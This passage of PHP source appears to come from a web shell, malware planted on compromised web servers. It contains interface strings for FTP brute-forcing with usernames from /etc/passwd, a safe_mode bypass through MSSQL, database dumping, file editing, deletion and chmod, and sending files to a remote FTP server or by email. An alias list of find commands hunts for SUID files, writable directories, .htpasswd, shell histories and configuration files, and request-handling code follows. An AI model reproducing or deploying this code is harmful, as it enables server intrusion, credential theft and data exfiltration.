'eng_text38'=>'Password',
'eng_text39'=>'Table',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text77'=>'Show database structure',
'eng_text78'=>'show tables',
'eng_text79'=>'show columns',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>?</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users'])) 
 { 
 if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else 
  { 
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); 
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 { 
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); } 
 if(empty($os)){ $os ="-"; $unix=1; } 
 else
    {
    if(@eregi